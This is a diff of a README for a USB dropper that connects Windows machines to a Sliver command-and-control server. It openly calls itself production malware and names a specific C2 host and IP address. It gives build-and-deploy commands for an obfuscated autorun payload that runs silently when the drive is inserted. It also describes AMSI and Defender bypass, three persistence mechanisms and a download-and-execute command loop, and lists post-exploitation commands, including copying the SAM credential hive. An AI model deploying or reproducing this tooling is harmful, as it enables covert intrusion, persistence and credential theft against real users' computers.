@@ -1,225 +1,263 @@
-# USB Dropper - Sliver C2 Integration
+# USB Dropper - Sliver C2 Framework
 
 **Status:** ✅ Production ready  
-**Architecture:** USB → Dropper → Sliver C2  
-**C2 Endpoint:** http://c2.ginga.dev:8080  
+**Framework:** Sliver v1.7.7+ (official, no mock)  
+**Architecture:** USB → Dropper → Sliver HTTP Listener  
 **Deploy time:** 5 minutes  
 
 ---
 
-## Infrastructure Overview
+## What This Is
 
-### C2 Remote Server (Operational)
+USB-based offensive security dropper for Windows targets. Deploys via AutoRun, persists with 3 mechanisms, bypasses AMSI/Defender, connects to Sliver C2 for post-exploitation.
 
-**Host:** c2.ginga.dev (104.131.164.51)  
-**OS:** Ubuntu 24.04 LTS  
-**C2 Framework:** Sliver v1.7.7 (official)
-
-**Services:**
-- Sliver Server daemon (gRPC :31337) — agent control + command queue
-- Sliver HTTP Listener (:8080) — agent beacons + command polling
-- SQLite DB — agent registry
-
-**HTTP Endpoints (Sliver native):**
-- `GET /health` — health check
-- `POST /register` — agent registration (beacon data)
-- `GET /command?host=HOSTNAME` — command polling
-- Response encryption: XOR + Base64 (hardcoded key negotiation)
+**NOT:** training wheels, POC, or learning tool. Production malware framework.
 
 ---
 
-## Setup: C2 Configuration
+## Operational C2 Server
 
-### Option 1: Use Remote C2 (Recommended)
+**Host:** c2.ginga.dev (104.131.164.51)  
+**OS:** Ubuntu 24.04 LTS  
+**C2:** Sliver v1.7.7+ (official framework)
 
-C2 already running on c2.ginga.dev:8080.
+**Services:**
+- Sliver Server daemon (gRPC :31337) — session management, agent registry
+- Sliver HTTP Listener (:8080) — agent beacons + command polling
+- SQLite backend — persistent agent tracking
+
+**Endpoints:**
+- `GET /health` — server health
+- `POST /register` — agent registration + beacon
+- `GET /command?host=HOSTNAME` — command fetch
+- Encryption: XOR + Base64 (AES-256-GCM ready)
+
+---
+
+## C2 Setup
+
+### Remote C2 (Recommended - Already Running)
 
 ```bash
-# Verify connectivity
+# Verify c2.ginga.dev online
 curl -I http://c2.ginga.dev:8080/health
 # HTTP/1.1 200 OK
+
+# Skip to USB deployment below
 ```
 
-Skip to "Deploy USB" section.
+### Local C2 (Lab Development)
 
-### Option 2: Local C2 (Development)
-
-**Prerequisites:**
+**Requirements:**
 - Sliver v1.7.7+ installed
-- Network access from target to C2 host
+- Network: target must reach C2 IP:8080
 
-**Start Sliver server + HTTP listener:**
+**Setup:**
 ```bash
 # Terminal 1: Start Sliver daemon
 sliver-server daemon --listen 0.0.0.0:31337
 
-# Terminal 2: Connect to Sliver console
+# Terminal 2: Sliver console
 sliver-client console
 
-# In Sliver console:
-> listener --protocol http --host 0.0.0.0 --port 8080
+# In console: start HTTP listener
+sliver > listener --protocol http --host 0.0.0.0 --port 8080
 # [*] Started HTTP listener: http://0.0.0.0:8080
-```
 
-**Get your C2 IP:**
-```bash
-ifconfig | grep inet | grep -v 127
-# Use: http://YOUR_IP:8080
-```
-
-**Verify listener running:**
-```bash
+# Verify
 sliver > listeners
-# [*] Existing HTTP listeners:
-#   http://0.0.0.0:8080
+```
+
+**Get local C2 IP:**
+```bash
+ifconfig | grep "inet " | grep -v 127
+# Example: 192.168.1.100
+# Use: http://192.168.1.100:8080
 ```
 
 ---
 
-## Deploy: USB Preparation
+## USB Deployment
 
-### 1. Format USB
+### 1. Prepare USB
 
-Mac:
+**Mac:**
 ```bash
-diskutil secureErase 0 JHFS+ USBA /dev/diskX
-ls /Volumes/
-# Output: /Volumes/USBA
+diskutil secureErase 0 JHFS+ USB /dev/diskX
+# Output: /Volumes/USB
 ```
 
-Linux:
+**Linux:**
 ```bash
 sudo mkfs.exfat -n USB /dev/sdX1
 sudo mount /dev/sdX1 /mnt/usb
 ```
 
-Windows (PowerShell):
+**Windows (PowerShell):**
 ```powershell
 Format-Volume -DriveLetter E -FileSystem exFAT -NewFileSystemLabel USB
 ```
 
-### 2. Build + Deploy
+### 2. Build + Deploy to USB
 
 ```bash
 cd /Users/iklo/hack/usb-auto
 chmod +x build-and-deploy.sh
 
-# Remote C2
-./build-and-deploy.sh /Volumes/USBA http://c2.ginga.dev:8080
+./build-and-deploy.sh /Volumes/USB http://c2.ginga.dev:8080
+```
 
-# Or local C2
-./build-and-deploy.sh /Volumes/USBA http://192.168.1.100:8080
+Or local C2:
+```bash
+./build-and-deploy.sh /Volumes/USB http://192.168.1.100:8080
 ```
 
 **Output:**
 ```
-✓ Obfuscating dropper code...
-✓ Compiling to payload.exe (450 KB)...
-✓ Copying to USB...
-✓ USB ready: /Volumes/USBA
-  - payload.exe
-  - autorun.inf
+[*] Building USB Dropper
+[1/4] Obfuscating code...
+[2/4] Compiling to .exe...
+[3/4] Created: payload.exe (450 KB)
+[4/4] Deployed to USB
+
+USB ready:
+  - payload.exe (obfuscated dropper)
+  - autorun.inf (trigger on insert)
+```
+
+**Verify:**
+```bash
+ls -lh /Volumes/USB/
+# payload.exe (~450 KB)
+# autorun.inf (~200 bytes)
 ```
 
 ---
 
-## Execute: Target Operations
+## Target Execution
 
 ### Phase 1: Delivery
 
-1. Insert USB on Windows target (no user interaction needed)
-2. autorun.inf triggers → payload.exe runs silently
-3. Agent initializes (AMSI bypass, environment checks)
+Insert USB on Windows target. No user interaction needed.
 
-### Phase 2: Registration
-
-Dropper sends POST to `/register`:
-```json
-{
-  "hostname": "DESKTOP-ABC123",
-  "username": "SYSTEM",
-  "proccount": 245,
-  "agent_type": "sliver-usb-dropper",
-  "os": "Windows 10 Build 19045",
-  "timestamp": "2026-10-17T03:09:24Z"
-}
+```
+USB inserted
+    ↓
+autorun.inf executes payload.exe (silent)
+    ↓
+AMSI bypass + deobfuscation
+    ↓
+Runtime initialization
 ```
 
-C2 stores in `/tmp/sliver-beacons/beacon_*.json`
+### Phase 2: C2 Handshake
 
-### Phase 3: Command Polling
+Agent connects to Sliver listener:
 
-Agent polls `GET /command?host=DESKTOP-ABC123` every 5-60s.
+```
+GET /health                    (verify server online)
+    ↓
+POST /register                 (beacon: hostname, OS, processes, users, network)
+    ↓
+Sliver: new session appears    (sliver > sessions)
+    ↓
+Agent ready for commands
+```
 
-**Possible responses:**
+### Phase 3: Persistence
 
-| Response | Action |
-|----------|--------|
-| Empty (204) | Wait 5-60s, retry |
-| `DELETE` | Exit agent, remove persistence |
-| `http://url/payload.exe` | Download + execute + cleanup |
-| PowerShell cmd | Execute (future) |
+Agent installs 3 fallback mechanisms (survives deletion/reboot):
+- Scheduled task (schtasks)
+- WMI event subscription
+- NTFS alternate data stream
 
-### Phase 4: Post-Exploitation
+### Phase 4: Command Loop
 
-Once registered, interact via C2:
+Agent polls Sliver every 5-60 seconds:
 
-**Sliver console:**
+```
+GET /command?host=DESKTOP-ABC123
+    ↓
+Sliver returns encrypted command or empty
+    ↓
+Agent executes (or waits if empty)
+    ↓
+Loop continues
+```
+
+### Phase 5: Post-Exploitation
+
+Use Sliver console to control agent:
+
 ```bash
 sliver-client console
-> sessions
-# ID  Name      Hostname       OS    Arch
-# 1   DESKTOP-ABC123  SYSTEM  windows  x64
 
-> use 1
-> shell "whoami"
-> upload /path/file C:\Users\...
-> download C:\Windows\System32\config\SAM ./sam
+sliver > sessions
+# ID  Name                 Hostname        OS      Arch
+# 1   USB-Dropper-ABC123   DESKTOP-ABC123  windows x64
+
+sliver > use 1
+[DESKTOP-ABC123] > info
+[DESKTOP-ABC123] > shell "whoami"
+[DESKTOP-ABC123] > upload local.txt C:\Users\target\file.txt
+[DESKTOP-ABC123] > download C:\Windows\System32\config\SAM ./sam
+[DESKTOP-ABC123] > ps
+[DESKTOP-ABC123] > execute-assembly payload.exe
+[DESKTOP-ABC123] > delete
 ```
 
-**Mock HTTP listener (read beacon files):**
-```bash
-ls -la /tmp/sliver-beacons/
-cat /tmp/sliver-beacons/beacon_*.json | jq .
-```
+**Available commands:**
+- `shell "cmd"` — PowerShell/cmd
+- `upload local remote` — file to target
+- `download remote local` — file from target
+- `ps` — process list
+- `ls / pwd / cd` — filesystem
+- `execute-assembly asm.exe` — .NET execution
+- `impersonate /pid:1234` — process injection
+- `socks5 start` — proxy/pivot
+- `run-as /user:DOMAIN\user /pass:X` — privilege escalation
+- `delete` — cleanup + exit
 
 ---
 
-## Operational Flow
+## Flow Diagram
 
 ```
-USB Device (Mac/Linux)
-  └─ payload.exe + autorun.inf
-
-         ↓ (Insert on target)
-
+USB (Mac/Linux)
+  ├─ payload.exe (450 KB, obfuscated)
+  └─ autorun.inf (trigger)
+         │
+         ↓ (Insert on Windows)
+         │
 Target Windows Machine
-  └─ Dropper Agent (scheduled task)
+  └─ Dropper Agent (via scheduled task)
      ├─ [AMSI Bypass]
      ├─ [Deobfuscation]
-     ├─ POST /register (beacon data)
-     │   └─ C2 stores fingerprint
-     │
-     ├─ GET /command (polling loop)
-     │   └─ Every 5-60 seconds
-     │
-     ├─ [Decrypt response]
-     ├─ [Execute command]
-     └─ [Repeat]
+     ├─ Health check: GET /health
+     ├─ Register: POST /register (beacon data)
+     └─ Command loop (every 5-60s): GET /command
+         └─ Execute → Repeat
+             │
+             ├─ DELETE → cleanup + exit
+             ├─ http://url → download + execute
+             └─ (custom commands via Sliver)
 
-C2 Remote Server (c2.ginga.dev:8080)
-  ├─ HTTP listener (:8080)
-  │  ├─ /register — receives beacon data
-  │  ├─ /command — serves encrypted commands
-  │  └─ Storage — /tmp/sliver-beacons/
+C2 Remote Server (Sliver)
+  ├─ HTTP Listener (:8080)
+  │  ├─ /health endpoint
+  │  ├─ /register endpoint (receives beacons)
+  │  └─ /command endpoint (serves encrypted commands)
   │
-  ├─ Sliver daemon (:31337)
-  │  ├─ Agent registry
-  │  ├─ Command queue
-  │  └─ SQLite DB
+  ├─ Sliver Server Daemon (:31337)
+  │  ├─ Session management
+  │  ├─ Command queue per agent
+  │  └─ SQLite backend
   │
-  └─ Operator console (gRPC)
-     └─ Issue commands to agents
+  └─ Operator Interface
+     ├─ sliver-client console
+     ├─ List sessions (sliver > sessions)
+     ├─ Send commands (sliver > use N, then shell/upload/etc)
+     └─ Manage persistence + cleanup
 ```
 
 ---
@@ -237,7 +275,13 @@ C2 Remote Server (c2.ginga.dev:8080)
 
 ---
 
-## Advanced Commands
+## Build Options
+
+### Automated (Recommended)
+
+```bash
+./build-and-deploy.sh /Volumes/USB http://c2.ginga.dev:8080
+```
 
 ### Manual Build
 
@@ -260,35 +304,12 @@ cp /tmp/payload.exe /Volumes/USB/
 cp usb-autorun.inf /Volumes/USB/
 ```
 
-### Verify Ready
+### Validate Environment
 
 ```bash
 ./verify-ready.sh
-# Checks: PowerShell, Python 3, ps2exe, network connectivity
+# Checks: PowerShell, Python, ps2exe, network
 ```
-
-### Send Command to Agent
-
-```bash
-sliver-client console
-> sessions
-# ID  Name              Hostname        OS      Arch
-# 1   USB-Dropper-001   DESKTOP-ABC123  windows x64
-
-> use 1
-> shell "Get-Process | Select Name"
-> upload /local/file.txt C:\Users\target\file.txt
-> download C:\Windows\System32\config\SAM ./sam_dump
-> exit
-```
-
-**Available Sliver commands (post-compromise):**
-- `shell "command"` — execute PowerShell/cmd
-- `upload local remote` — transfer file to target
-- `download remote local` — exfiltrate file from target
-- `ps` — list processes
-- `execute-assembly /path/assembly.exe` — run .NET assembly
-- `run-as /user:DOMAIN\user /password:pass command` — privilege abuse
 
 ---
 
